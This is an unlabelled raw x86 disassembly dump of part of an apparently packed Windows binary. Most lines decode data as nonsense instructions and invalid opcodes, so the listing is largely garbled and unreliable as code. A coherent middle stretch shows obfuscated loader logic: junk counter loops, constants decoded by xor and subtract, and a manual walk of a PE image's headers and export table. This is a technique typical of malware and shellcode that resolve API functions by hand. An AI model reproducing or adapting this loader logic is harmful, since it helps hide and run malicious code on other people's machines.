  40e265:	enter  0xcf88,0xee
  40e269:	cmp    eax,0xf2ddea34
  40e26e:	test   BYTE PTR ds:0x95b75fcb,0x1a
  40e275:	dec    eax
  40e276:	push   ebp
  40e277:	cmp    DWORD PTR [ebp+0x6f],0x4c
  40e27b:	pop    ecx
  40e27c:	mov    cs,WORD PTR [esi]
  40e27e:	push   ebx
  40e27f:	dec    edi
  40e280:	cld    
  40e281:	or     al,BYTE PTR [ebp+0x62]
  40e284:	jp     0x40e2a7
  40e286:	jns    0x40e2e9
  40e288:	(bad)  
  40e289:	(bad)  
  40e28a:	out    dx,eax
  40e28b:	mov    eax,0x1a16a19b
  40e290:	das    
  40e291:	add    BYTE PTR [edi+0x24fff872],ch
  40e297:	inc    edx
  40e298:	popa   
  40e299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e29a:	inc    eax
  40e29b:	ret    0x1a6f
  40e29e:	dec    edi
  40e29f:	cmp    al,0x66
  40e2a1:	js     0x40e25b
  40e2a3:	dec    esp
  40e2a4:	(bad)  
  40e2a6:	dec    edx
  40e2a7:	mov    ?,WORD PTR [edx+0x5342a32c]
  40e2ad:	jmp    0xd4ee:0xbc4a82d5
  40e2b4:	test   BYTE PTR ds:0x2ce6498c,0xb2
  40e2bc:	icebp  
  40e2bd:	mov    ebx,0x8d963418
  40e2c2:	sbb    cl,BYTE PTR [ecx+0x42]
  40e2c5:	mov    esp,0xd04b08a3
  40e2ca:	dec    esi
  40e2cb:	into   
  40e2cc:	dec    eax
  40e2cd:	test   al,al
  40e2cf:	dec    esi
  40e2d0:	je     0x40e2d0
  40e2d2:	arpl   WORD PTR [ecx+0x519c1336],bx
  40e2d8:	push   0x48
  40e2da:	add    al,0xc9
  40e2dc:	jb     0x40e354
  40e2de:	xchg   BYTE PTR [ebx],dh
  40e2e0:	(bad)  
  40e2e2:	sub    BYTE PTR [ebx],bh
  40e2e4:	dec    edi
  40e2e5:	xor    dl,bh
  40e2e7:	push   ds
  40e2e8:	cmp    ch,dh
  40e2ea:	sbb    DWORD PTR [edx+0x39],0x76
  40e2ee:	adc    esp,DWORD PTR [ebx+0x7d]
  40e2f1:	add    DWORD PTR [ebp+0x4],ecx
  40e2f4:	aad    0x6
  40e2f6:	aam    0xbc
  40e2f8:	sbb    eax,0xf6d83a2f
  40e2fd:	push   esi
  40e2fe:	pop    ebp
  40e2ff:	push   esp
  40e300:	mov    al,ds:0x5e9f1524
  40e305:	cli    
  40e306:	pop    ds
  40e307:	fidiv  WORD PTR [ecx-0x5]
  40e30a:	out    dx,eax
  40e30b:	scas   al,BYTE PTR es:[edi]
  40e30c:	ss mov ebx,0xe18044af
  40e312:	fmul   DWORD PTR [ebx+0x1daa502c]
  40e318:	push   ds
  40e319:	cld    
  40e31a:	pop    esp
  40e31b:	out    0x53,al
  40e31d:	stos   BYTE PTR es:[edi],al
  40e31e:	push   0xc
  40e320:	add    al,BYTE PTR ds:0xfb523fa5
  40e326:	stos   BYTE PTR es:[edi],al
  40e327:	jmp    0xb6d22f56
  40e32c:	lods   eax,DWORD PTR ds:[esi]
  40e32d:	adc    DWORD PTR [edx],ebx
  40e32f:	inc    ecx
  40e330:	jp     0x40e2d0
  40e332:	push   cs
  40e333:	jo     0x40e2ef
  40e335:	cli    
  40e336:	xlat   BYTE PTR ds:[ebx]
  40e337:	xor    al,0xae
  40e339:	retf   
  40e33a:	sub    eax,0xf1534543
  40e33f:	ret    0x44cc
  40e342:	jl     0x40e3ac
  40e344:	in     eax,0x2b
  40e346:	dec    edx
  40e347:	lods   al,BYTE PTR ds:[esi]
  40e348:	(bad)  
  40e34a:	and    DWORD PTR [ecx-0x5f873271],ebp
  40e350:	jo     0x40e351
  40e352:	sub    ebx,ebx
  40e354:	xchg   ebx,eax
  40e355:	pushf  
  40e356:	mov    ebp,0x63d85576
  40e35b:	repz dec esi
  40e35d:	int3   
  40e35e:	into   
  40e35f:	mov    dl,0x3f
  40e361:	clc    
  40e362:	int3   
  40e363:	lahf   
  40e364:	mov    esi,0xd3a4b998
  40e369:	mov    esp,0x3ab84f7a
  40e36e:	mov    ah,0xe4
  40e370:	mov    bl,0xc5
  40e372:	retf   0x1a76
  40e375:	add    eax,eax
  40e377:	sbb    esp,DWORD PTR [ecx-0x3dfcee28]
  40e37d:	imul   eax,DWORD PTR [esi]
  40e380:	or     esi,0x11ff
  40e386:	mov    esi,DWORD PTR [ebp+0x8]
  40e389:	or     DWORD PTR ds:0x420e7e,0x420fac
  40e393:	xor    esi,ecx
  40e395:	and    DWORD PTR ds:0x420e7a,0x420f6c
  40e39f:	add    esi,edx
  40e3a1:	mov    DWORD PTR ds:0x420f04,0x5e6d
  40e3ab:	cmp    esi,eax
  40e3ad:	mov    eax,0x6dd0
  40e3b2:	mov    eax,DWORD PTR [ebp-0x4]
  40e3b5:	push   ebx
  40e3b6:	mov    DWORD PTR ds:0x420efc,0x12bd
  40e3c0:	je     0x40e450
  40e3c6:	and    DWORD PTR ds:0x420e92,0x0
  40e3d0:	jmp    0x40e3e2
  40e3d5:	mov    esi,DWORD PTR ds:0x420e92
  40e3db:	inc    esi
  40e3dc:	mov    DWORD PTR ds:0x420e92,esi
  40e3e2:	cmp    DWORD PTR ds:0x420e92,0x1b
  40e3e9:	jae    0x40e407
  40e3ef:	cmp    DWORD PTR ds:0x420e92,0x23
  40e3f6:	jne    0x40e402
  40e3fc:	call   DWORD PTR ds:0x424811
  40e402:	jmp    0x40e3d5
  40e407:	mov    esi,DWORD PTR [ebp-0x18]
  40e40a:	add    DWORD PTR [eax],esi
  40e40c:	add    eax,esi
  40e40e:	mov    eax,DWORD PTR [ebp-0x4]
  40e411:	sub    esi,DWORD PTR ds:0x420fb0
  40e417:	mov    esi,DWORD PTR [ebp+0xc]
  40e41a:	xor    DWORD PTR ds:0x420efc,0x420e8e
  40e424:	xor    esi,ecx
  40e426:	add    esi,edx
  40e428:	sbb    DWORD PTR ds:0x420ef8,0x67e3
  40e432:	imul   esi,DWORD PTR [eax]
  40e435:	mov    DWORD PTR ds:0x420f00,0x5d4a
  40e43f:	mov    DWORD PTR [eax],esi
  40e441:	mov    DWORD PTR ds:0x420efc,0x3930
  40e44b:	jmp    0x40e4ec
  40e450:	mov    esi,DWORD PTR [ebp+0x14]
  40e453:	and    DWORD PTR ds:0x420f68,0x0
  40e45d:	mov    ebx,DWORD PTR ds:0x420f68
  40e463:	inc    ebx
  40e464:	mov    DWORD PTR ds:0x420f68,ebx
  40e46a:	cmp    DWORD PTR ds:0x420f68,0x21
  40e471:	jne    0x40e482
  40e477:	push   0x420f08
  40e47c:	call   DWORD PTR ds:0x424815
  40e482:	cmp    DWORD PTR ds:0x420f68,0x19
  40e489:	jb     0x40e45d
  40e48f:	and    DWORD PTR ds:0x42201c,0x0
  40e499:	mov    edi,DWORD PTR ds:0x42201c
  40e49f:	inc    edi
  40e4a0:	mov    DWORD PTR ds:0x42201c,edi
  40e4a6:	cmp    DWORD PTR ds:0x42201c,0xd
  40e4ad:	jne    0x40e4c3
  40e4b3:	push   0x5b5d
  40e4b8:	push   0x5762
  40e4bd:	call   DWORD PTR ds:0x4247d5
  40e4c3:	cmp    DWORD PTR ds:0x42201c,0xc
  40e4ca:	jne    0x40e4dd
  40e4d0:	mov    edi,DWORD PTR ds:0x42201c
  40e4d6:	inc    edi
  40e4d7:	mov    DWORD PTR ds:0x42201c,edi
  40e4dd:	cmp    DWORD PTR ds:0x42201c,0x16
  40e4e4:	jb     0x40e499
  40e4ea:	xor    DWORD PTR [eax],esi
  40e4ec:	adc    ebx,DWORD PTR ds:0x420f58
  40e4f2:	mov    eax,DWORD PTR [ebp-0x4]
  40e4f5:	mov    edi,DWORD PTR [ebp+0x10]
  40e4f8:	mov    ebx,DWORD PTR ds:0x420ebe
  40e4fe:	mov    esi,DWORD PTR ds:0x420f80
  40e504:	sub    ebx,esi
  40e506:	add    ebx,DWORD PTR [ebx+esi*1]
  40e509:	xor    edi,ecx
  40e50b:	mov    ebx,DWORD PTR ds:0x420fb0
  40e511:	add    DWORD PTR ds:0x420efc,ebx
  40e517:	mov    esi,0xffcd8d23
  40e51c:	inc    ebx
  40e51d:	mov    ebx,esi
  40e51f:	sub    ebx,edi
  40e521:	add    DWORD PTR [eax],ebx
  40e523:	adc    edi,0x4f91
  40e529:	mov    eax,DWORD PTR [ebp-0x4]
  40e52c:	mov    edi,DWORD PTR [ebp-0x8]
  40e52f:	xor    DWORD PTR ds:0x420e8e,0x422014
  40e539:	add    edi,DWORD PTR [eax]
  40e53b:	mov    DWORD PTR [ebp-0x8],edi
  40e53e:	mov    eax,DWORD PTR [ebp+0xc]
  40e541:	mov    edi,DWORD PTR [ebp+0xc]
  40e544:	xor    edi,ecx
  40e546:	xor    eax,ecx
  40e548:	lea    eax,[eax+edi*1+0x64e5ba]
  40e54f:	mov    edi,DWORD PTR [ebp+0xc]
  40e552:	xor    edi,ecx
  40e554:	add    edi,edx
  40e556:	imul   eax,edi
  40e559:	mov    edi,DWORD PTR [ebp+0xc]
  40e55c:	xor    edi,ecx
  40e55e:	sub    edi,eax
  40e560:	mov    eax,DWORD PTR [ebp-0x4]
  40e563:	add    edi,edx
  40e565:	cmp    DWORD PTR [eax],edi
  40e567:	mov    eax,DWORD PTR [ebp-0x4]
  40e56a:	mov    edi,DWORD PTR [ebp+0x10]
  40e56d:	jg     0x40e580
  40e573:	xor    edi,ecx
  40e575:	mov    ebx,esi
  40e577:	sub    ebx,edi
  40e579:	add    DWORD PTR [eax],ebx
  40e57b:	jmp    0x40e586
  40e580:	xor    edi,ecx
  40e582:	add    edi,edx
  40e584:	add    DWORD PTR [eax],edi
  40e586:	mov    eax,DWORD PTR [ebp-0x8]
  40e589:	mov    edi,DWORD PTR [ebp-0x10]
  40e58c:	mov    eax,DWORD PTR [eax]
  40e58e:	xor    edi,ecx
  40e590:	add    edi,0x3272dc
  40e596:	not    edi
  40e598:	and    eax,edi
  40e59a:	movsx  di,BYTE PTR [eax+0x1]
  40e59f:	mov    ebx,0x3b4c
  40e5a4:	sub    di,bx
  40e5a7:	mov    ebx,0x8a89
  40e5ac:	xor    di,bx
  40e5af:	mov    ebx,0x4f87
  40e5b4:	cmp    di,bx
  40e5b7:	jne    0x40e5df
  40e5bd:	movsx  di,BYTE PTR [eax]
  40e5c1:	mov    ebx,0x3b4c
  40e5c6:	sub    di,bx
  40e5c9:	mov    ebx,0x8a89
  40e5ce:	xor    di,bx
  40e5d1:	mov    ebx,0x4f88
  40e5d6:	cmp    di,bx
  40e5d9:	je     0x40e5ef
  40e5df:	mov    edi,DWORD PTR [ebp-0x10]
  40e5e2:	xor    edi,ecx
  40e5e4:	mov    ebx,esi
  40e5e6:	sub    ebx,edi
  40e5e8:	add    eax,ebx
  40e5ea:	jmp    0x40e59a
  40e5ef:	mov    esi,DWORD PTR [ebp-0x14]
  40e5f2:	mov    esi,DWORD PTR [esi]
  40e5f4:	mov    edi,DWORD PTR [eax+0x3c]
  40e5f7:	lea    esi,[edi+esi*8+0x78]
  40e5fb:	mov    esi,DWORD PTR [esi+eax*1]
  40e5fe:	mov    DWORD PTR [ebp-0x8],esi
  40e601:	mov    esi,DWORD PTR [ebp+0x8]
  40e604:	xor    esi,ecx
  40e606:	add    esi,edx
  40e608:	mov    DWORD PTR [ebp-0x14],esi
  40e60b:	mov    esi,DWORD PTR [ebp+0x8]
  40e60e:	mov    edi,DWORD PTR [ebp-0x8]
  40e611:	xor    esi,ecx
  40e613:	add    esi,edx
  40e615:	pop    ebx
  40e616:	cmp    edi,esi
  40e618:	jne    0x40e636
  40e61e:	mov    eax,DWORD PTR [ebp+0xc]
  40e621:	xor    eax,ecx
  40e623:	mov    ecx,DWORD PTR [ebp-0x8]
  40e626:	add    eax,edx
  40e628:	imul   eax,ecx
  40e62b:	mov    DWORD PTR [ebp-0x8],eax
  40e62e:	push   DWORD PTR [ebp+0x18]
  40e631:	jmp    0x410a04
  40e636:	mov    ecx,DWORD PTR [ebp-0x8]
  40e639:	add    ecx,eax
  40e63b:	mov    DWORD PTR [ebp-0x14],ecx
  40e63e:	mov    ecx,DWORD PTR [ebp-0x14]
  40e641:	mov    ecx,DWORD PTR [ecx+0xc]
  40e644:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e649:	mov    edx,0x3b4c
  40e64e:	sub    cx,dx
  40e651:	mov    edx,0x8a89
  40e656:	xor    cx,dx
  40e659:	mov    edx,0x4e76
  40e65e:	jmp    0x4109d8
  40e663:	stc    
  40e664:	add    BYTE PTR [edx+ebp*1],bh
  40e667:	pop    ss
  40e668:	push   cs
  40e669:	sti    
  40e66a:	or     ebx,DWORD PTR [ebx]
  40e66c:	mov    edx,0x205ef2
  40e671:	ins    DWORD PTR es:[edi],dx
  40e672:	lds    esi,FWORD PTR [ebx-0x36]
  40e675:	jp     0x40e6f1
  40e677:	sbb    DWORD PTR [edi+0x7a],ebx
  40e67a:	jp     0x40e697
  40e67c:	bound  ebp,QWORD PTR [edi-0x62]
  40e67f:	ja     0x40e690
  40e681:	out    dx,eax
  40e682:	cwde   
  40e683:	jo     0x40e65d
  40e685:	mov    eax,ds:0xd4d41c7b
  40e68a:	(bad)  
  40e68b:	ror    al,0xef
  40e68e:	adc    eax,DWORD PTR [esi+edi*1-0x40]
  40e692:	add    BYTE PTR [eax-0x1207a0e],dl
  40e698:	push   eax
  40e699:	dec    DWORD PTR [ecx]
  40e69b:	sti    
  40e69c:	jp     0x40e668
  40e69e:	mov    cl,0xf4
  40e6a0:	inc    eax
  40e6a1:	and    ebx,ecx
  40e6a3:	and    al,0x5f
  40e6a5:	pop    ss
  40e6a6:	pop    ds
  40e6a7:	fwait
  40e6a8:	mov    dl,0x88
  40e6aa:	cmp    BYTE PTR [esi],dl
  40e6ac:	add    BYTE PTR [esi+0x1c],ah
  40e6af:	add    DWORD PTR [ecx],esi
  40e6b1:	test   eax,0x6b40bc0a
  40e6b6:	mov    edi,DWORD PTR [edi+0x150f1e8a]
  40e6bc:	ret    
  40e6bd:	daa    
  40e6be:	dec    ebx
  40e6bf:	test   DWORD PTR [edi-0x1c],0xc769bc21
  40e6c6:	es in  eax,0xbe
  40e6c9:	mov    es,ecx
  40e6cb:	adc    al,0xde
  40e6cd:	test   al,0xbf
  40e6cf:	pushw  ds
  40e6d1:	add    DWORD PTR [edx],ebx
  40e6d3:	xchg   esp,eax
  40e6d4:	pop    edx
  40e6d5:	stos   DWORD PTR es:[edi],eax
  40e6d6:	lods   eax,DWORD PTR ds:[esi]
  40e6d7:	mov    cl,0x0
  40e6d9:	(bad)  
  40e6da:	in     al,dx
  40e6db:	aas    
  40e6dc:	xchg   ecx,eax
  40e6dd:	sahf   
  40e6de:	js     0x40e66b
  40e6e0:	scas   al,BYTE PTR es:[di]
  40e6e2:	xlat   BYTE PTR ds:[ebx]
  40e6e3:	pop    esi
  40e6e4:	jmp    FWORD PTR [ecx]
  40e6e6:	ja     0x40e756
  40e6e8:	fiadd  WORD PTR [edi+edi*1+0x17]
  40e6ec:	outs   dx,DWORD PTR ds:[esi]
  40e6ed:	sub    ebp,ebp
  40e6ef:	sbb    al,0xae
  40e6f1:	inc    ebp
  40e6f2:	popf   
  40e6f3:	push   edi
  40e6f4:	dec    eax
  40e6f5:	jl     0x40e71f
  40e6f7:	push   ecx
  40e6f8:	stos   BYTE PTR es:[edi],al
  40e6f9:	jp     0x40e6f5
  40e6fb:	retf   0x5fbb
  40e6fe:	and    al,0x7c
  40e700:	push   ebp
  40e701:	sti    
  40e702:	pop    ebx
  40e703:	xchg   DWORD PTR [edi+0x1819dced],esp
  40e709:	mov    edx,0x6d6f58f7
  40e70e:	xor    eax,0x7b238fe4
  40e713:	loopne 0x40e6bf
  40e715:	lds    esp,FWORD PTR [edx]
  40e717:	ins    BYTE PTR es:[edi],dx
  40e718:	hlt    
  40e719:	int3   
  40e71a:	xor    BYTE PTR [esp+esi*2+0x13],al
  40e71e:	fwait
  40e71f:	iret   
  40e720:	(bad)  
  40e721:	xor    esi,eax
  40e723:	jl     0x40e77a
  40e725:	or     eax,0xd4678dfb
  40e72a:	mov    ch,0x6b
  40e72c:	and    eax,DWORD PTR gs:[esi-0x455f7096]
  40e733:	retf   
  40e734:	test   eax,0xac021bba
  40e739:	lea    edi,[edi]
  40e73b:	jnp    0x40e6c8
  40e73d:	push   0x4eb42d7
  40e742:	push   eax
  40e743:	pop    eax
  40e744:	jae    0x40e72c
  40e746:	jb     0x40e78a
  40e748:	mov    ?,WORD PTR [edi-0x61]
  40e74b:	mov    ds:0xe871c65c,eax
  40e750:	sub    BYTE PTR [eax-0x6067c192],al
  40e756:	xor    BYTE PTR [edi+0x38ef1cf2],ch
  40e75c:	mov    eax,ds:0xe818a8c7
  40e761:	test   BYTE PTR [edi],0x8e
  40e764:	rol    BYTE PTR es:[ecx],1
  40e767:	inc    ebp
  40e768:	repz mov ebx,0xbcb68b0f
  40e76e:	pusha  
  40e76f:	or     al,BYTE PTR [eax-0x5]
  40e772:	cmp    bh,BYTE PTR [eax-0x5]
  40e775:	add    dh,BYTE PTR [edi-0x34]
  40e778:	in     eax,0x6c
  40e77a:	nop
  40e77b:	cmp    bl,dh
  40e77d:	cmc    
  40e77e:	cli    
  40e77f:	and    eax,0x77f9d6a4
  40e784:	cmp    ecx,edi
  40e786:	into   
  40e787:	fisub  WORD PTR [edi+0x30]
  40e78a:	jmp    0x74b368a2
  40e78f:	aam    0x74
  40e791:	out    dx,al
  40e792:	jecxz  0x40e805
  40e794:	push   ebp
  40e795:	xchg   ebp,eax
  40e796:	mov    cl,0x55
  40e798:	repnz sub al,0x97
  40e79b:	icebp  
  40e79c:	cld    
  40e79d:	popa   
  40e79e:	xchg   ebx,eax
  40e79f:	add    al,0x1d
  40e7a1:	or     cl,BYTE PTR [edi+edi*8+0x74]
  40e7a5:	adc    al,0xb2
  40e7a7:	inc    ecx
  40e7a8:	pop    ebp
  40e7a9:	cmp    edi,esp
  40e7ab:	scas   eax,DWORD PTR es:[edi]
  40e7ac:	inc    ebx
  40e7ad:	stos   BYTE PTR es:[edi],al
  40e7ae:	outs   dx,BYTE PTR ds:[esi]
  40e7af:	daa    
  40e7b0:	repnz dec edx
  40e7b2:	aad    0xc6
  40e7b4:	mov    ebp,0x538349ee
  40e7b9:	or     ah,dl
  40e7bb:	push   ecx
  40e7bc:	retf   
  40e7bd:	add    eax,0x2eaf0f0a
  40e7c2:	jbe    0x40e78d
  40e7c4:	cli    
  40e7c5:	mov    al,ds:0x2bcc5cbb
  40e7ca:	int3   
  40e7cb:	jns    0x40e756
  40e7cd:	mov    eax,0xfe1d8d61
  40e7d2:	sbb    DWORD PTR [ebx+0x5b],edx
  40e7d5:	push   ecx
  40e7d6:	cmp    DWORD PTR [ebx-0x55f71806],eax
  40e7dc:	and    dh,dh
  40e7de:	dec    esi
  40e7df:	dec    esi
  40e7e0:	push   0xfcab413f
  40e7e5:	(bad)  
  40e7e6:	enter  0x8a44,0xec
  40e7ea:	cmp    eax,0xdbc4961f
  40e7ef:	xchg   ebx,eax
  40e7f0:	addr16 jae 0x40e7fe
  40e7f3:	fisttp QWORD PTR [ebx+eax*1-0x7f]
  40e7f7:	xchg   ebp,eax
  40e7f8:	push   edx
  40e7f9:	sbb    BYTE PTR [edi],dl
  40e7fb:	sub    ah,BYTE PTR [edi+eiz*2+0x7]
  40e7ff:	aam    0xcb
  40e801:	in     al,dx
  40e802:	push   0xb9deb682
  40e807:	mov    eax,0x17267128
  40e80c:	cs inc ecx
  40e80e:	push   edx
  40e80f:	xchg   ecx,eax
  40e810:	push   es
  40e811:	mov    BYTE PTR [ebp+0x14b679b2],dh
  40e817:	jp     0x40e7d6
  40e819:	sub    eax,0x8c44a2d2
  40e81e:	pop    ebx
  40e81f:	(bad)  
  40e820:	(bad)  
  40e821:	mov    eax,0x67f94080
  40e826:	or     eax,0x4faf88c4
  40e82b:	and    esp,ecx
  40e82d:	fstp   DWORD PTR [edi+0x69]
  40e830:	jmp    0xf95f:0x7e32ca34
  40e837:	loope  0x40e889
  40e839:	and    al,0x6c
  40e83b:	inc    eax
  40e83c:	call   0xab742b58
  40e841:	sbb    cl,BYTE PTR [edx-0x64]
  40e844:	push   edx
  40e845:	cmp    BYTE PTR [edx-0x5478d3c],ch
  40e84b:	lock out dx,al
  40e84d:	push   ds
  40e84e:	outs   dx,DWORD PTR ds:[esi]
  40e84f:	sub    eax,0x25334848
  40e854:	mov    eax,ds:0x4146f6b3
  40e859:	outs   dx,DWORD PTR ds:[esi]
  40e85a:	inc    ecx
  40e85b:	(bad)  
  40e85c:	ins    BYTE PTR es:[edi],dx
  40e85d:	xchg   esi,eax
  40e85e:	and    BYTE PTR [ebx],ch
  40e860:	adc    ecx,edx
  40e862:	(bad)  
  40e863:	jne    0x40e8ce
  40e865:	int    0x8e
  40e867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e868:	and    bl,ah
  40e86a:	or     eax,0x50296e88
  40e86f:	sub    DWORD PTR [ecx+0x4a],0x9824151c
  40e876:	loope  0x40e855
  40e878:	lock ins DWORD PTR es:[edi],dx
  40e87a:	mul    DWORD PTR [ebx+0x6a]
  40e87d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e87e:	inc    esi
  40e87f:	inc    ebp
  40e880:	fwait
  40e881:	pop    ds
  40e882:	inc    ecx
  40e883:	sub    al,0x3
  40e885:	leave  
  40e886:	lock out 0x5f,eax
  40e889:	mov    esi,0xecead222
  40e88e:	pop    edi
  40e88f:	jo     0x40e86e
  40e891:	out    dx,eax
  40e892:	loop   0x40e90e
  40e894:	rcl    DWORD PTR [ebp-0x3057384c],cl
  40e89a:	and    DWORD PTR [edx+0x129afd90],edi
  40e8a0:	xchg   esi,eax
  40e8a1:	jns    0x40e85d
  40e8a3:	data16 xor ch,BYTE PTR [ecx]
  40e8a6:	mov    edx,0x1f47921e
  40e8ab:	hlt    
  40e8ac:	inc    ebx
  40e8ad:	pop    ecx
  40e8ae:	sbb    esi,esi
  40e8b0:	ret    
  40e8b1:	icebp  
  40e8b2:	pop    esp
  40e8b3:	pushf  
  40e8b4:	cdq    
  40e8b5:	retf   0x1a24
  40e8b8:	sti    
  40e8b9:	imul   ebx,DWORD PTR [esi+edx*4],0xe6884580
  40e8c0:	mov    ebx,0x7b5e6c28
  40e8c5:	outs   dx,BYTE PTR ds:[esi]
  40e8c6:	test   eax,0x8dec1b36
  40e8cb:	pop    ds
  40e8cc:	xchg   ebp,eax
  40e8cd:	mov    bh,0xfa
  40e8cf:	adc    BYTE PTR [ecx],cl
  40e8d1:	leave  
  40e8d2:	sbb    DWORD PTR [ecx-0x30],ebx
  40e8d5:	outs   dx,DWORD PTR ds:[esi]
  40e8d6:	stos   BYTE PTR es:[edi],al
  40e8d7:	cmp    al,0xbe
  40e8d9:	call   0x33350cba
  40e8de:	mov    ebx,0xfd33c49a
  40e8e3:	(bad)  
  40e8e4:	adc    cl,BYTE PTR [ebp-0x34be5de9]
  40e8ea:	test   al,0x42
  40e8ec:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40e8ee:	mov    al,0xdb
  40e8f0:	mov    ah,0x66
  40e8f2:	jecxz  0x40e92c
  40e8f4:	push   ebx
  40e8f5:	jl     0x40e8b0
  40e8f7:	out    0x6e,eax
  40e8f9:	icebp  
  40e8fa:	jb     0x40e96e
  40e8fc:	retf   
  40e8fd:	lods   al,BYTE PTR ds:[esi]
  40e8fe:	mov    ecx,0xe722b10c
  40e903:	shl    BYTE PTR [edi-0x38],1
  40e906:	inc    ecx
  40e907:	es cs xchg ecx,eax
  40e90a:	inc    edi
  40e90b:	gs pop es
  40e90d:	jns    0x40e928
  40e90f:	rol    DWORD PTR [edi-0x75807428],0x95
  40e916:	clc    
  40e917:	xchg   esp,eax
  40e918:	in     al,dx
  40e919:	sbb    eax,0x7ac3f76a
  40e91e:	or     al,0x36
  40e920:	and    ebx,ebx
  40e922:	push   ds
  40e923:	imul   ebx,DWORD PTR [edi+0x72dff462],0xfffffffa
  40e92a:	adc    eax,0x3565d5ef
  40e92f:	mov    DWORD PTR [ecx-0x5795c78d],eax
  40e935:	or     BYTE PTR [edi-0x3d],0xfd
  40e939:	xchg   esi,eax
  40e93a:	mov    edi,0x2d0e12d8
  40e93f:	pop    edi
  40e940:	mov    al,0xb0
  40e942:	(bad)  
  40e944:	mov    DWORD PTR [ecx+ecx*4-0x7b],esp
  40e948:	lock xor al,0xb4
  40e94b:	sti    
  40e94c:	pop    ecx
  40e94d:	lea    ebp,ss:[edx]
  40e950:	int    0xa2
  40e952:	pop    edi
  40e953:	or     BYTE PTR [ecx+edi*2],cl
  40e956:	pop    ebp
  40e957:	enter  0x7eb2,0x8c
  40e95b:	push   esi
  40e95c:	push   eax
  40e95d:	xor    al,0xc3
  40e95f:	ds (bad) 
  40e962:	sbb    eax,0x18795df2
  40e967:	aad    0x5
  40e969:	fwait
  40e96a:	stos   BYTE PTR es:[edi],al
  40e96b:	test   BYTE PTR [ebx-0x408435c7],bh
  40e971:	scas   al,BYTE PTR es:[edi]
  40e972:	inc    ecx
  40e973:	mov    eax,0xcce37c77
  40e978:	rcl    DWORD PTR [eax-0x6d],0x82
  40e97c:	mov    cl,0x2f
  40e97e:	fdivrp st(6),st
  40e980:	mov    dl,0x4c
  40e982:	mov    ecx,ecx
  40e984:	or     DWORD PTR [eax+esi*4-0x7f1fcf68],0x60
  40e98c:	sbb    dl,BYTE PTR [esi-0xbd1db07]
  40e992:	outs   dx,BYTE PTR ds:[esi]
  40e993:	mov    dl,0x3e
  40e995:	sbb    bl,BYTE PTR [ebx-0x37df0ce2]
  40e99b:	mov    ah,0xc1
  40e99d:	in     al,dx
  40e99e:	test   DWORD PTR [eax],0x48e12c8c
  40e9a4:	fbstp  TBYTE PTR [ebp+ecx*1-0x52cde828]
  40e9ab:	jl     0x40ea0b
  40e9ad:	jo     0x40ea29
  40e9af:	dec    edx
  40e9b0:	push   ecx
  40e9b1:	pop    ss
  40e9b2:	das    
  40e9b3:	jle    0x40ea23
  40e9b5:	aam    0x99
  40e9b7:	js     0x40e99c
  40e9b9:	mov    ebp,0x56abd659
  40e9be:	rcl    DWORD PTR [edi-0x7d6212b9],1
  40e9c4:	iret   
  40e9c5:	jb     0x40e94e
  40e9c7:	loop   0x40e959
  40e9c9:	jbe    0x40e94d
  40e9cb:	push   eax
  40e9cc:	std    
  40e9cd:	and    cl,BYTE PTR [ecx-0x1e]
  40e9d0:	out    dx,eax
  40e9d1:	data16 sub BYTE PTR [edx],dl
  40e9d4:	mov    bh,BYTE PTR [eax]
  40e9d6:	sbb    eax,0xf369f3d7
  40e9db:	cmp    ah,BYTE PTR [ebx-0x559f9088]
  40e9e1:	and    al,0xa
  40e9e3:	fisubr WORD PTR [edi-0x5e]
  40e9e6:	test   ax,0x7ea
  40e9ea:	dec    ecx
  40e9eb:	mov    cl,0xf3
  40e9ed:	int3   
  40e9ee:	dec    eax
  40e9ef:	(bad)  
  40e9f0:	repnz add DWORD PTR [edi+0xbf0fc7f],esi
  40e9f7:	jle    0x40ea49
  40e9f9:	push   ebx
  40e9fa:	ins    DWORD PTR es:[edi],dx
  40e9fb:	sti    
  40e9fc:	and    edi,DWORD PTR [eax]
  40e9fe:	inc    edi
  40e9ff:	inc    edx
  40ea00:	(bad)  
  40ea01:	nop
  40ea02:	es jg  0x40ea4e
  40ea05:	jge    0x40e9db
  40ea07:	bound  ebp,QWORD PTR [ecx-0x75]
  40ea0a:	sbb    ch,BYTE PTR ds:[eax]
  40ea0d:	popf   
  40ea0e:	in     al,0x29
  40ea10:	fisttp QWORD PTR [eax+0x29]
  40ea13:	jp     0x40ea64
  40ea15:	test   bl,cl
  40ea17:	imul   DWORD PTR [esi+0x68500b92]
  40ea1d:	xor    esp,eax
  40ea1f:	and    BYTE PTR [edi],ch
  40ea21:	mov    ecx,0xaece4c1c
  40ea26:	cmp    BYTE PTR [edx],cl
  40ea28:	inc    eax
  40ea29:	dec    esp
  40ea2a:	loopne 0x40e9c3
  40ea2c:	popa   
  40ea2d:	add    al,0xad
  40ea2f:	cli    
  40ea30:	inc    esi
  40ea31:	outs   dx,BYTE PTR ds:[esi]
  40ea32:	stc    
  40ea33:	and    BYTE PTR [edx+0x56],0x1d
  40ea37:	(bad)  
  40ea38:	cmp    ecx,eax
  40ea3a:	jge    0x40eab7
  40ea3c:	imul   esp,eax,0x7e
  40ea3f:	ds push edi
  40ea41:	push   0xe8c13d9a
  40ea46:	fst    st(6)
  40ea48:	adc    BYTE PTR [ecx+0xac2aed3],dl
  40ea4e:	pop    ss
  40ea4f:	mov    ?,WORD PTR [ebx+0x20]
  40ea52:	sub    eax,0x4479285f
  40ea57:	retf   0x2a7c
  40ea5a:	pop    ss
  40ea5b:	push   0xffffff9a
  40ea5d:	dec    eax
  40ea5e:	add    eax,0x6245e735
  40ea63:	cmp    cl,BYTE PTR [ebp+0x23]
  40ea66:	(bad)  
  40ea67:	cmp    al,0x4e
  40ea69:	jns    0x40ea55
  40ea6b:	mov    eax,0xbbf15da4
  40ea70:	sbb    esp,esp
  40ea72:	adc    BYTE PTR [ebp+0x2a],bl
  40ea75:	jecxz  0x40e9fe
  40ea77:	lock ret 
  40ea79:	repnz lods eax,DWORD PTR ds:[esi]
  40ea7b:	xchg   esi,eax
  40ea7c:	jo     0x40ea80
  40ea7e:	into   
  40ea7f:	xchg   esp,eax
  40ea80:	sahf   
  40ea81:	jbe    0x40eab5
  40ea83:	sub    DWORD PTR [ecx],ecx
  40ea85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea86:	sub    esi,DWORD PTR [eax]
